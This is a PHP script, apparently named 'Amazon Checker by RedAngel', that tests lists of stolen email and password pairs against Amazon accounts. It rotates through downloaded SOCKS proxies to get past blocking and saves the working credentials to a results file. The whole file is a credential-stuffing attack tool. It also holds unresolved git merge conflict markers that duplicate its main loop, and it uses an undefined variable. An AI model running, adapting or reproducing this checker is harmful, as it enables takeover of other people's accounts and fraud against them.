<?php
<<<<<<< HEAD
function simpen($str, $file)
{
    $h = fopen(__DIR__.'/results/'.$file, 'a');
    $w = fwrite($h, $str);
    fclose($h);
    return $w;
=======
function simpen($str,$file){
	$h = fopen(__DIR__.'/results/'.$file,'a');
	$w = fwrite($h,$str);
	fclose($h);
	return $w;
>>>>>>> ab49f339ee981bd89d75c62da87595e800346123
}
error_reporting(0);
/*ini_set('display_errors',false);
ini_set('max_execution_time',false);
ini_set('memory_limit','4G');
ignore_user_abort(true);*/
require __DIR__."/check.php";
require __DIR__."/System/socks.php";
print "Amazon Checker by RedAngel\n";
print "RedAngel PHP Concept 2017\n\n\n";
print "Mendownload Socks...\n";
<<<<<<< HEAD
$socks = array_merge(socker(), socker(), socker(), socker(), socker(), socker());
=======
$socks = array_merge(socker(),socker(),socker(),socker(),socker(),socker());
>>>>>>> ab49f339ee981bd89d75c62da87595e800346123
$socks = array_filter($socks);
$socks = array_unique($socks);
$cs = count($socks);
$sockspos = 0;
print "\nBerhasil mendownload {$cs} socks... !!!\n";
$sc = scandir(__DIR__.'/Assets');
<<<<<<< HEAD
unset($sc[0], $sc[1]);
$data = array();
print "memulai checking  kleng....\n--------------------------\n\n";
$jum = 1;
foreach ($sc as $isi) {
    $ex = explode("\n", file_get_contents(__DIR__.'/Assets/'.$isi));
    foreach ($ex as $pecah) {
        $rtc = explode('|', $pecah);
        
        print($jum++)."\n";
        print 'email : '.$rtc[1]."\n";
        print 'pass : '.$rtc[2]."\n\n";
        print 'status : '."\n";
        $rt = json_decode(checkerra(trim($rtc[1]), trim($rtc[2]), trim($socks[$sockspos])), true);
        if ($sockspos>=$cs) {
            print "\nSocks habis...\n";
            print "Mendownload socks...\n\n";
            $socks = array_merge(socker(), socker(), socker(), socker(), socker(), socker());
            $socks = array_filter($socks);
            $socks = array_unique($socks);
            $cs = count($socks);
            $sockspos = 0;
        }
        /**
        *		error 3
        */
        if ($rt['error']==3) {
            print $rt['error'].' | '.$rt['msg']."\n";
            while ($rt['error']==3 and strpos($rt['msg'], "Captcha")==false) {
                $sockspos++;
                $rt = json_decode(checkerra(trim($rtc[1]), trim($rtc[2]), trim($socks[$sockspos])), true);
                print $rt['error'].' | '.$rt['msg']."\n";
                if ($sockspos>=$cs) {
                    print "\nSocks habis...\n";
                    print "Mendownload socks...\n\n";
                    $socks = array_merge(socker(), socker());
                    $socks = array_filter($socks);
                    $socks = array_unique($socks);
                    $cs = count($socks);
                    $sockspos = 0;
                }
            }
            if (strpos($rt['msg'], "LIVE")!==false) {
                print $rt['error'].' | '.$rt['msg']."\n";
                simpen(json_encode(array(
            $rtc[1], $rtc[2], $rt['msg']
            )).PHP_EOL, 'sukses.txt');
            } elseif (strpos($rt['msg'], "Captcha")!==false) {
                simpen("a | ".$rtc[1]." | ".$rtc[2]." | ".$rt['msg'], "rung_kecek.txt");
            }
        } elseif /**
        * success
        */
        ($error==0) {
            print $rt['error'].' | '.$rt['msg']."\n";
            simpen(json_encode(array(
            $rtc[1], $rtc[2], $rt['msg']
            )).PHP_EOL, 'sukses.txt');
        } else {
            print $rt['error'].' | '.$rt['msg']."\n";
        }
        simpen(json_encode(array($rtc,$rt))."\n", "logs.txt");
        print "\n\n";
    }
}
=======
unset($sc[0],$sc[1]);
$data = array();
print "memulai checking  kleng....\n--------------------------\n\n";
$jum = 1;
foreach($sc as $isi){
	
	$ex = explode("\n",file_get_contents(__DIR__.'/Assets/'.$isi));
	foreach($ex as $pecah){
		$rtc = explode('|',$pecah);
		
		print ($jum++)."\n";
		print 'email : '.$rtc[1]."\n";
		print 'pass : '.$rtc[2]."\n\n";
		print 'status : '."\n";
		$rt = json_decode(checkerra(trim($rtc[1]),trim($rtc[2]),trim($socks[$sockspos])),true);
		if($sockspos>=$cs){
		print "\nSocks habis...\n";
		print "Mendownload socks...\n\n";
		$socks = array_merge(socker(),socker(),socker(),socker(),socker(),socker());
$socks = array_filter($socks);
$socks = array_unique($socks);
$cs = count($socks);
$sockspos = 0;
	}
		/**
		*		error 3
		*/
		if($rt['error']==3){
			print $rt['error'].' | '.$rt['msg']."\n";
		while($rt['error']==3 and strpos($rt['msg'],"Captcha")==false){$sockspos++;
				$rt = json_decode(checkerra(trim($rtc[1]),trim($rtc[2]),trim($socks[$sockspos])),true);
			print $rt['error'].' | '.$rt['msg']."\n";if($sockspos>=$cs){
		print "\nSocks habis...\n";
		print "Mendownload socks...\n\n";
		$socks = array_merge(socker(),socker());
$socks = array_filter($socks);
$socks = array_unique($socks);
$cs = count($socks);
$sockspos = 0;
	}
		}
		if(strpos($rt['msg'],"LIVE")!==false){
			print $rt['error'].' | '.$rt['msg']."\n";
			simpen(json_encode(array(
			$rtc[1], $rtc[2], $rt['msg']
			)).PHP_EOL,'sukses.txt');
		} else 
		if(strpos($rt['msg'],"Captcha")!==false){
			simpen("a | ".$rtc[1]." | ".$rtc[2]." | ".$rt['msg'],"rung_kecek.txt");
		}
		
	} else
		/**
		* success 
		*/
		if($error==0){
			print $rt['error'].' | '.$rt['msg']."\n";
			simpen(json_encode(array(
			$rtc[1], $rtc[2], $rt['msg']
			)).PHP_EOL,'sukses.txt');
		} else {
		print $rt['error'].' | '.$rt['msg']."\n";
		}
		simpen(json_encode(array($rtc,$rt))."\n","logs.txt");
		print "\n\n";
	}
}


>>>>>>> ab49f339ee981bd89d75c62da87595e800346123
